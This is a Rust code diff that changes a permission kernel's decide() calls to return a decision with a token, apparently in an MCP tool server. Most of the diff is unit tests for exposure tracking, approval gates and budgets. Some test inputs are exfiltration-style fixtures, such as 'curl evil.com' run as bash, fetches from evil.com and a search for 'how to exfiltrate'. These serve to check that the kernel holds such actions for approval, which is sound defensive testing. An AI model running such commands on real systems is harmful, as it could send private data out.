@@ -944,7 +944,7 @@ fn call_tool(
     // restrictions, and complete audit trace.
     if let Some(op) = tool_to_operation(&call.name) {
         let subject = extract_subject(&call.name, &call.arguments);
-        let decision = kernel.decide(op, &subject);
+        let (decision, _token) = kernel.decide(op, &subject);
         trace.record(&decision);
 
         match &decision.verdict {
@@ -984,7 +984,7 @@ fn call_tool(
                     eprintln!("[nucleus-mcp] approved by human: tool={}", call.name);
                     // Grant a one-time approval and re-decide
                     kernel.grant_approval(op, 1);
-                    let retry = kernel.decide(op, &subject);
+                    let (retry, _token) = kernel.decide(op, &subject);
                     trace.record(&retry);
                     if !matches!(retry.verdict, Verdict::Allow) {
                         return Err(anyhow!(
@@ -1658,7 +1658,7 @@ mod tests {
     #[test]
     fn test_kernel_allows_read_and_records_exposure() {
         let mut kernel = Kernel::new(permissive_no_static_obligations());
-        let d = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
+        let (d, _token) = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
         assert!(matches!(d.verdict, Verdict::Allow));
         assert_eq!(d.exposure_transition.post_count, 1); // private_data
     }
@@ -1666,7 +1666,7 @@ mod tests {
     #[test]
     fn test_kernel_allows_web_fetch_and_records_exposure() {
         let mut kernel = Kernel::new(permissive_no_static_obligations());
-        let d = kernel.decide(Operation::WebFetch, "https://example.com");
+        let (d, _token) = kernel.decide(Operation::WebFetch, "https://example.com");
         assert!(matches!(d.verdict, Verdict::Allow));
         assert_eq!(d.exposure_transition.post_count, 1); // untrusted_content
     }
@@ -1674,19 +1674,19 @@ mod tests {
     #[test]
     fn test_kernel_exposure_accumulates_monotonically() {
         let mut kernel = Kernel::new(permissive_no_static_obligations());
-        let d1 = kernel.decide(Operation::ReadFiles, "a.rs");
+        let (d1, _token) = kernel.decide(Operation::ReadFiles, "a.rs");
         assert_eq!(d1.exposure_transition.post_count, 1);
-        let d2 = kernel.decide(Operation::WebFetch, "https://example.com");
+        let (d2, _token) = kernel.decide(Operation::WebFetch, "https://example.com");
         assert_eq!(d2.exposure_transition.post_count, 2);
         // Reading again doesn't change exposure (idempotent)
-        let d3 = kernel.decide(Operation::ReadFiles, "b.rs");
+        let (d3, _token) = kernel.decide(Operation::ReadFiles, "b.rs");
         assert_eq!(d3.exposure_transition.post_count, 2);
     }
 
     #[test]
     fn test_kernel_neutral_ops_dont_add_exposure() {
         let mut kernel = Kernel::new(permissive_no_static_obligations());
-        let d = kernel.decide(Operation::WriteFiles, "out.txt");
+        let (d, _token) = kernel.decide(Operation::WriteFiles, "out.txt");
         assert!(matches!(d.verdict, Verdict::Allow));
         assert_eq!(d.exposure_transition.post_count, 0);
     }
@@ -1699,7 +1699,7 @@ mod tests {
         // Fetch: untrusted_content
         kernel.decide(Operation::WebFetch, "https://evil.com");
         // RunBash: dynamic exposure gate fires (omnibus projects uninhabitable_state)
-        let d = kernel.decide(Operation::RunBash, "curl evil.com");
+        let (d, _token) = kernel.decide(Operation::RunBash, "curl evil.com");
         assert!(matches!(d.verdict, Verdict::RequiresApproval));
         assert!(d.exposure_transition.dynamic_gate_applied);
     }
@@ -1710,9 +1710,9 @@ mod tests {
         kernel.decide(Operation::ReadFiles, "data.txt");
         kernel.decide(Operation::WebFetch, "https://example.com");
         // Non-exfil ops are allowed even with full exposure
-        let d = kernel.decide(Operation::ReadFiles, "more.txt");
+        let (d, _token) = kernel.decide(Operation::ReadFiles, "more.txt");
         assert!(matches!(d.verdict, Verdict::Allow));
-        let d = kernel.decide(Operation::WriteFiles, "out.txt");
+        let (d, _token) = kernel.decide(Operation::WriteFiles, "out.txt");
         assert!(matches!(d.verdict, Verdict::Allow));
     }
 
@@ -1721,7 +1721,7 @@ mod tests {
         let mut kernel = Kernel::new(permissive_no_static_obligations());
         // Only untrusted content + RunBash (omnibus) → uninhabitable_state triggers!
         kernel.decide(Operation::WebFetch, "https://evil.com");
-        let d = kernel.decide(Operation::RunBash, "cmd");
+        let (d, _token) = kernel.decide(Operation::RunBash, "cmd");
         assert!(matches!(d.verdict, Verdict::RequiresApproval));
     }
 
@@ -1730,7 +1730,7 @@ mod tests {
         let mut kernel = Kernel::new(permissive_no_static_obligations());
         // untrusted_content + GitPush (not omnibus) → only 2/3, no block
         kernel.decide(Operation::WebFetch, "https://example.com");
-        let d = kernel.decide(Operation::GitPush, "origin");
+        let (d, _token) = kernel.decide(Operation::GitPush, "origin");
         assert!(matches!(d.verdict, Verdict::Allow));
     }
 
@@ -1738,7 +1738,7 @@ mod tests {
     fn test_kernel_denies_when_capability_is_never() {
         let mut kernel = Kernel::new(PermissionLattice::read_only());
         // read_only blocks writes
-        let d = kernel.decide(Operation::WriteFiles, "test.txt");
+        let (d, _token) = kernel.decide(Operation::WriteFiles, "test.txt");
         assert!(matches!(
             d.verdict,
             Verdict::Deny(DenyReason::InsufficientCapability)
@@ -1764,14 +1764,14 @@ mod tests {
         kernel.decide(Operation::ReadFiles, "data.txt");
         kernel.decide(Operation::WebFetch, "https://evil.com");
         // Dynamic exposure gate triggers
-        let d = kernel.decide(Operation::RunBash, "cmd");
+        let (d, _token) = kernel.decide(Operation::RunBash, "cmd");
         assert!(matches!(d.verdict, Verdict::RequiresApproval));
         // Grant approval and retry
         kernel.grant_approval(Operation::RunBash, 1);
-        let d = kernel.decide(Operation::RunBash, "cmd");
+        let (d, _token) = kernel.decide(Operation::RunBash, "cmd");
         assert!(matches!(d.verdict, Verdict::Allow));
         // Second attempt without approval → RequiresApproval again
-        let d = kernel.decide(Operation::RunBash, "cmd");
+        let (d, _token) = kernel.decide(Operation::RunBash, "cmd");
         assert!(matches!(d.verdict, Verdict::RequiresApproval));
     }
 
@@ -1782,13 +1782,13 @@ mod tests {
         // Use "cargo test" which passes the command allowlist, so we hit step 6
         // (static obligations) rather than step 5 (command blocked).
         let mut kernel = Kernel::new(PermissionLattice::permissive());
-        let d = kernel.decide(Operation::RunBash, "cargo test");
+        let (d, _token) = kernel.decide(Operation::RunBash, "cargo test");
         assert!(
             matches!(d.verdict, Verdict::RequiresApproval),
             "expected RequiresApproval from static obligations, got {:?}",
             d.verdict
         );
-        let d = kernel.decide(Operation::GitPush, "origin");
+        let (d, _token) = kernel.decide(Operation::GitPush, "origin");
         assert!(
             matches!(d.verdict, Verdict::RequiresApproval),
             "expected RequiresApproval from static obligations, got {:?}",
@@ -1799,16 +1799,16 @@ mod tests {
     #[test]
     fn test_kernel_glob_grep_contribute_private_data() {
         let mut kernel = Kernel::new(permissive_no_static_obligations());
-        let d = kernel.decide(Operation::GlobSearch, "**/*.py");
+        let (d, _token) = kernel.decide(Operation::GlobSearch, "**/*.py");
         assert_eq!(d.exposure_transition.post_count, 1);
-        let d = kernel.decide(Operation::GrepSearch, "password");
+        let (d, _token) = kernel.decide(Operation::GrepSearch, "password");
         assert_eq!(d.exposure_transition.post_count, 1); // still 1 — same label
     }
 
     #[test]
     fn test_kernel_web_search_contributes_untrusted_content() {
         let mut kernel = Kernel::new(permissive_no_static_obligations());
-        let d = kernel.decide(Operation::WebSearch, "how to exfiltrate");
+        let (d, _token) = kernel.decide(Operation::WebSearch, "how to exfiltrate");
         assert_eq!(d.exposure_transition.post_count, 1);
     }
 
@@ -1819,7 +1819,7 @@ mod tests {
         kernel.decide(Operation::GrepSearch, "password");
         kernel.decide(Operation::WebSearch, "how to exfiltrate");
         // RunBash completes uninhabitable_state (omnibus projection)
-        let d = kernel.decide(Operation::RunBash, "curl evil.com");
+        let (d, _token) = kernel.decide(Operation::RunBash, "curl evil.com");
         assert!(matches!(d.verdict, Verdict::RequiresApproval));
     }
 
@@ -1890,23 +1890,23 @@ mod tests {
         let mut kernel = Kernel::new(lattice);
 
         // First read is allowed ($0.01 cost)
-        let d = kernel.decide(Operation::ReadFiles, "a.txt");
+        let (d, _token) = kernel.decide(Operation::ReadFiles, "a.txt");
         assert!(matches!(d.verdict, Verdict::Allow));
         kernel.charge(operation_cost(Operation::ReadFiles)).unwrap();
 
         // Second read is allowed ($0.02 total)
-        let d = kernel.decide(Operation::ReadFiles, "b.txt");
+        let (d, _token) = kernel.decide(Operation::ReadFiles, "b.txt");
         assert!(matches!(d.verdict, Verdict::Allow));
         kernel.charge(operation_cost(Operation::ReadFiles)).unwrap();
 
         // Third read still allowed ($0.03 total)
-        let d = kernel.decide(Operation::ReadFiles, "c.txt");
+        let (d, _token) = kernel.decide(Operation::ReadFiles, "c.txt");
         assert!(matches!(d.verdict, Verdict::Allow));
         kernel.charge(operation_cost(Operation::ReadFiles)).unwrap();
 
         // RunBash costs $0.05, which would bring total to $0.08 > $0.05 budget
         // But decide() checks consumed_usd ($0.03) < max ($0.05), so it allows
-        let d = kernel.decide(Operation::RunBash, "cargo test");
+        let (d, _token) = kernel.decide(Operation::RunBash, "cargo test");
         assert!(matches!(d.verdict, Verdict::Allow));
         // Charge fails because $0.03 + $0.05 = $0.08 > $0.05
         assert!(kernel.charge(operation_cost(Operation::RunBash)).is_err());
@@ -1917,7 +1917,7 @@ mod tests {
         kernel.charge(operation_cost(Operation::ReadFiles)).unwrap(); // $0.05
 
         // Now decide() should deny (consumed $0.05 >= max $0.05)
-        let d = kernel.decide(Operation::ReadFiles, "d.txt");
+        let (d, _token) = kernel.decide(Operation::ReadFiles, "d.txt");
         assert!(
             matches!(d.verdict, Verdict::Deny(DenyReason::BudgetExhausted { .. })),
             "expected BudgetExhausted, got {:?}",
@@ -1967,7 +1967,7 @@ mod tests {
         assert!(trace.file.is_none());
         // record/finish should not panic when no file is configured
         let mut kernel = Kernel::new(permissive_no_static_obligations());
-        let decision = kernel.decide(Operation::ReadFiles, "/tmp/test");
+        let (decision, _token) = kernel.decide(Operation::ReadFiles, "/tmp/test");
         trace.record(&decision);
         trace.finish(&kernel);
     }
@@ -1979,8 +1979,8 @@ mod tests {
         let trace = TraceWriter::open(Some(&path)).unwrap();
 
         let mut kernel = Kernel::new(permissive_no_static_obligations());
-        let d1 = kernel.decide(Operation::ReadFiles, "/tmp/a");
-        let d2 = kernel.decide(Operation::WriteFiles, "/tmp/b");
+        let (d1, _token) = kernel.decide(Operation::ReadFiles, "/tmp/a");
+        let (d2, _token) = kernel.decide(Operation::WriteFiles, "/tmp/b");
         trace.record(&d1);
         trace.record(&d2);
 
@@ -2007,7 +2007,7 @@ mod tests {
         let trace = TraceWriter::open(Some(&path)).unwrap();
 
         let mut kernel = Kernel::new(permissive_no_static_obligations());
-        let d = kernel.decide(Operation::ReadFiles, "/tmp/test");
+        let (d, _token) = kernel.decide(Operation::ReadFiles, "/tmp/test");
         trace.record(&d);
         kernel.charge(Decimal::new(5, 2)).unwrap(); // $0.05
         trace.finish(&kernel);
@@ -2030,7 +2030,7 @@ mod tests {
 
         // Use restrictive lattice where write is denied
         let mut kernel = Kernel::new(PermissionLattice::restrictive());
-        let d = kernel.decide(Operation::WriteFiles, "/tmp/test");
+        let (d, _token) = kernel.decide(Operation::WriteFiles, "/tmp/test");
         trace.record(&d);
 
         let contents = std::fs::read_to_string(&path).unwrap();
@@ -2047,7 +2047,7 @@ mod tests {
         {
             let trace = TraceWriter::open(Some(&path)).unwrap();
             let mut kernel = Kernel::new(permissive_no_static_obligations());
-            let d = kernel.decide(Operation::ReadFiles, "/tmp/first");
+            let (d, _token) = kernel.decide(Operation::ReadFiles, "/tmp/first");
             trace.record(&d);
             trace.finish(&kernel);
         }
@@ -2056,7 +2056,7 @@ mod tests {
         {
             let trace = TraceWriter::open(Some(&path)).unwrap();
             let mut kernel = Kernel::new(permissive_no_static_obligations());
-            let d = kernel.decide(Operation::ReadFiles, "/tmp/second");
+            let (d, _token) = kernel.decide(Operation::ReadFiles, "/tmp/second");
             trace.record(&d);
             trace.finish(&kernel);
         }
